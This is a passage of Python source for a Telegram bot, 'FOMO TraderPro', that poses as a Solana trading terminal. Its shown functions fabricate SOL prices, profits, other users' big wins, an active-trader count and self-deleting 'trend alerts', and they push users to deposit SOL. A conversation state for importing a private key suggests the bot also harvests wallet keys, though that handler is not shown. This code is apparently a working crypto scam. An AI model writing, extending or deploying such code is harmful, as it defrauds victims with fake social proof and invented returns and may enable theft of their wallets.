    msg = await context.bot.send_message(
        chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode="Markdown"
    )
    user_data[user_id]["main_msg_id"] = msg.message_id
    last_main_edit_time[user_id] = time.time()  # added

async def show_settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = user_data[user_id]
    settings = ud["settings"]

    speed = settings["speed"]
    custom_tip = settings["custom_tip"]
    buy_slip = settings["buy_slippage"]
    sell_slip = settings["sell_slippage"]

    text = "**Settings** ⚙️"

    kb = []

    kb.append([
        InlineKeyboardButton(f"{'✅ ' if speed == 'Fast' else ''}Fast", callback_data="set_speed_fast"),
        InlineKeyboardButton(f"{'✅ ' if speed == 'Turbo' else ''}Turbo", callback_data="set_speed_turbo"),
        InlineKeyboardButton(f"{'✅ ' if speed == 'Custom' else ''}Custom", callback_data="set_speed_custom"),
    ])

    if speed == "Custom":
        kb.append([
            InlineKeyboardButton(f"✏️ Custom Tip ({custom_tip:.3f})", callback_data="edit_custom_tip"),
        ])
    else:
        kb.append([InlineKeyboardButton("Custom Tip (disabled)", callback_data="dummy")])

    kb.append([
        InlineKeyboardButton(f"✏️ Buy Slippage ({buy_slip}%)", callback_data="edit_buy_slippage"),
        InlineKeyboardButton(f"✏️ Sell Slippage ({sell_slip}%)", callback_data="edit_sell_slippage"),
    ])

    kb.append([
        InlineKeyboardButton(f"{'✅' if settings['auto_slippage'] else '⬜'} Auto Slippage", callback_data="toggle_auto_slippage"),
        InlineKeyboardButton(f"{'✅' if settings['confirm_trades'] else '⬜'} Confirm Trades", callback_data="toggle_confirm_trades"),
    ])

    kb.append([
        InlineKeyboardButton(f"{'✅' if settings['sell_protection'] else '⬜'} Sell Protection", callback_data="toggle_sell_protection"),
    ])

    kb.append([
        InlineKeyboardButton(f"{'🟢' if settings['mev_protect_buy'] else '🔴'} MEV Protect (Buy)", callback_data="toggle_mev_buy"),
        InlineKeyboardButton(f"{'🟢' if settings['mev_protect_sell'] else '🔴'} MEV Protect (Sell)", callback_data="toggle_mev_sell"),
    ])

    kb.append([
        InlineKeyboardButton("↩️ Back", callback_data="back_menu"),
    ])

    await edit_or_send(update, context, text, InlineKeyboardMarkup(kb))

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, force_new: bool = False):
    user_id = update.effective_user.id
    ud = user_data[user_id]
    wallet = ud.get("wallet")
    balance = ud.get("balance", 0.0)
    wallet_status = "Created ✓" if wallet else "Not created"

    if force_new and "welcome_shown" not in context.user_data:
        await context.bot.send_message(
            update.effective_chat.id,
            "🌟 **Welcome to FOMO TraderPro** 🌟\n\nAdvanced Solana trading terminal.\nConnect wallet to start.",
            parse_mode="Markdown"
        )
        context.user_data["welcome_shown"] = True

    fake_sol_price = random.uniform(185, 195)
    fake_big_win = random.randint(45000, 320000)
    fake_pnl = random.choices([0, random.randint(-800, -50), random.randint(300, 4500), random.randint(-500, 12000)],
                              weights=[0.4, 0.15, 0.25, 0.2])[0]

    k_display = f"{active_users:,}"

    status_lines = [
        "FOMO TRADER PRO",
        "Premium Terminal  •  Live",
        "",
        f"{k_display} active traders",
        f"Largest realized gain    +${fake_big_win:,}",
        f"Your realized PnL        {fake_pnl:+,.2f}",
        f"SOL / USD                ${fake_sol_price:.2f}",
        "",
        "Wallet"
    ]

    if wallet:
        status_lines.extend([
            "• Address",
            f"  ||`{wallet}`||",
            f"• Status          {wallet_status}",
            f"• Balance         {balance:.4f} SOL",
            f"• Equivalent      ${int(balance * fake_sol_price):,.2f}",
            "• **Tap on the address above to copy instantly** 📋",
            "• Pro access      Deposit ≥ 0.30 SOL for priority lanes"
        ])
    else:
        status_lines.extend([
            "• Address         Not created yet",
            f"• Status          {wallet_status}",
            "• Balance         0.0000 SOL",
            "• Equivalent      $0.00",
            "• **Tap to copy when created** 📋",
            "• Pro access      Deposit ≥ 0.30 SOL for priority lanes"
        ])

    status_lines.extend([
        "",
        "Trending momentum"
    ])

    hot_trades = generate_fake_trades(random.randint(6, 9))
    status_lines.extend(hot_trades)

    status_lines.append("")
    status_lines.append(f"Last refresh • {random.randint(8, 45)} seconds ago")

    text = "\n".join(status_lines)

    kb = [
        [InlineKeyboardButton("Buy 🛒", callback_data="buy"), InlineKeyboardButton("Sell 💰", callback_data="sell")],
        [InlineKeyboardButton("Deposit 💳", callback_data="deposit"), InlineKeyboardButton("Balance ⚖️", callback_data="balance")],
        [InlineKeyboardButton("Withdraw ↩️", callback_data="withdraw"), InlineKeyboardButton("Auto Trade 🤖", callback_data="auto")],
        [InlineKeyboardButton("Wallet 💼", callback_data="wallet"), InlineKeyboardButton("Limit Order 🎯", callback_data="limit")],
        [InlineKeyboardButton("Copy Trade 👥", callback_data="copy"), InlineKeyboardButton("Holdings 📦", callback_data="holdings")],
        [InlineKeyboardButton("DCA Order 🔁", callback_data="dca"), InlineKeyboardButton("Recent Trades 📈", callback_data="recent")],
        [InlineKeyboardButton("Transactions 📜", callback_data="tx"), InlineKeyboardButton("Settings ⚙️", callback_data="settings")],
        [
            InlineKeyboardButton("Refresh 🔄", callback_data="refresh"),
            InlineKeyboardButton("Support 🆘", url="https://t.me/FomoLiveSupport")
        ],
    ]

    await edit_or_send(update, context, text, InlineKeyboardMarkup(kb))

def generate_fake_trades(n=4):
    trades = [
        {"token": "$WIF", "pct": random.randint(80, 1200)},
        {"token": "$GOAT", "pct": random.randint(100, 800)},
        {"token": "$PNUT", "pct": random.randint(200, 1500)},
        {"token": "$michi", "pct": random.randint(50, 600)},
        {"token": "$FART", "pct": random.randint(300, 5000)},
        {"token": "$POPCAT", "pct": random.randint(80, 900)},
        {"token": "$MEW", "pct": random.randint(30, 400)},
        {"token": "$GIGA", "pct": random.randint(150, 1200)},
        {"token": "$BONK", "pct": random.randint(90, 700)},
    ]
    selected = random.sample(trades, min(n, len(trades)))
    selected.sort(key=lambda x: x["pct"], reverse=True)
    lines = []
    for i in range(0, len(selected), 3):
        chunk = selected[i:i+3]
        line = "   •   ".join(f"{t['token']} +{t['pct']}%  " for t in chunk)
        lines.append(line)
    return lines

def generate_fake_recent_trades(n=8):
    usernames = [
        "@DanielMorris", "@SophieTurner", "@MarcusLee", "@OliviaGrant", "@NathanCollins",
        "@EmmaRichardson", "@LucasBennett", "@HannahBrooks", "@RyanMitchell", "@ChloeAnderson",
        "@EthanWalker", "@GraceThompson", "@JamesCarter", "@IsabellaWright", "@AlexanderKing"
    ]
    tokens = ["$WIF", "$POPCAT", "$BONK", "$MYRO", "$SLERF", "$JUP", "$MEW", "$GIGA", "$WEN", "$HARAMBE", "$MOTHER", "$BOME", "$GOAT", "$FART", "$PNUT"]
    solana_prefixes = [
        "5FHwk", "8vBxck", "Cmu51B", "Hoyeh4", "A1b2C3", "D4e5F6", "G7h8I9", "J0kLmN",
        "2b3c4d", "7x8y9z", "3p4q5r", "6s7t8u", "9v0w1x", "4y5z6a", "B7c8d9", "E0f1g2"
    ]

    lines = []
    for _ in range(n):
        user = random.choice(usernames)
        prefix = random.choice(solana_prefixes)
        suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=4)).upper()
        sol_amount = round(random.uniform(0.5, 4.5), 2)
        token = random.choice(tokens)
        gain_usd = random.randint(22000, 150000)
        multiplier = random.randint(34, 200)
        time_ago = random.randint(2, 30)

        line = (
            f"{user}\n"
            f"Wallet: {prefix}…{suffix}\n"
            f"{sol_amount} SOL → {token}   +${gain_usd:,} (×{multiplier})   {time_ago} min ago"
        )
        lines.append(line)

    return "\n\n".join(lines)

async def fake_active_counter():
    global active_users
    MEAN = 7600
    MIN_ACTIVE = 6800
    MAX_ACTIVE = 8400

    while True:
        await asyncio.sleep(random.uniform(15, 42))
        change = random.randint(-45, 65)
        if random.random() < 0.18:
            change += random.choice([-1, 1]) * random.randint(120, 280)
        if random.random() < 0.04:
            change += random.choice([-1, 1]) * random.randint(350, 650)
        if random.random() < 0.12:
            pull_direction = 1 if active_users < MEAN else -1
            change += random.randint(40, 120) * pull_direction
        active_users += change
        active_users = max(MIN_ACTIVE, min(MAX_ACTIVE, active_users))

async def fake_trend_notifier(context: ContextTypes.DEFAULT_TYPE):
    global active_users, last_trend_msg_ids

    while True:
        await asyncio.sleep(random.uniform(18*60, 24*60))

        if len(user_data) == 0:
            continue

        msg = random.choice(FAKE_TREND_MESSAGES)

        if random.random() < 0.6:
            sol = round(random.uniform(300, 1800), 0)
            mult = random.randint(15, 120)
            msg += f"  — {sol:,} SOL inflow • ×{mult}"

        now = datetime.utcnow().strftime("%H:%M UTC")
        full_msg = f"📢 **TREND ALERT** {now}\n\n{msg}\n\nFOMO Trader Pro • Live"

        sent_count = 0

        for uid, data in list(user_data.items()):
            if not data.get("verified", False) or not data.get("wallet"):
                continue

            try:
                prev_msg_id = last_trend_msg_ids.get(uid)
                if prev_msg_id:
                    try:
                        await context.bot.delete_message(chat_id=uid, message_id=prev_msg_id)
                    except:
                        pass

                sent = await context.bot.send_message(
                    chat_id=uid,
                    text=full_msg,
                    parse_mode="Markdown",
                    disable_web_page_preview=True
                )

                last_trend_msg_ids[uid] = sent.message_id

                sent_count += 1

                async def auto_delete_task():
                    await asyncio.sleep(random.uniform(15, 20))
                    try:
                        await context.bot.delete_message(chat_id=uid, message_id=sent.message_id)
                    except:
                        pass

                asyncio.create_task(auto_delete_task())

            except Exception as e:
                if "blocked" in str(e).lower() or "chat not found" in str(e).lower():
                    user_data.pop(uid, None)
                    last_trend_msg_ids.pop(uid, None)

        if sent_count > 0:
            await context.bot.send_message(
                PRIVATE_CHANNEL_ID,
                f"[NOTIFIER] Sent trend alert to {sent_count} users • {now}",
                parse_mode=None
            )

# ────────────────────────────────────────────────
# Flask + Webhook Setup
# ────────────────────────────────────────────────
app = Flask(__name__)

# Global application and dispatcher (set in main)
application = None
dispatcher = None

@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_data = request.get_json(silent=True)
        if json_data:
            update = Update.de_json(json_data, application.bot)
            if update:
                asyncio.create_task(dispatcher.process_update(update))
        return jsonify(success=True), 200
    return jsonify(success=False), 400

@app.route('/')
def home():
    return "FOMO TraderPro webhook is alive", 200

@app.route('/health')
def health():
    return jsonify({"status": "ok", "active_users": active_users}), 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)

async def main():
    global application, dispatcher

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    application = Application.builder().token(BOT_TOKEN).build()
    dispatcher = application.dispatcher

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MENU: [CallbackQueryHandler(button_handler)],
            INPUT_PK: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_import_pk),
                CallbackQueryHandler(button_handler)
            ],
            INPUT_SETTING: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_setting_input)],
            INPUT_BUY_CA: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buy_ca_input),
                CallbackQueryHandler(button_handler)
            ],
        },
        fallbacks=[],
    )

    application.add_handler(conv)

    # Set webhook
    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}/{BOT_TOKEN}"
    await application.bot.set_webhook(url=webhook_url)
    print(f"Webhook set to: {webhook_url}")

    print("FOMO TraderPro running in webhook mode...")
    await application.initialize()
    await application.start()

    # Start background jobs
    application.job_queue.run_once(fake_active_counter, when=0)
    application.job_queue.run_repeating(fake_trend_notifier, interval=60, first=10)

    # Keep running forever
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
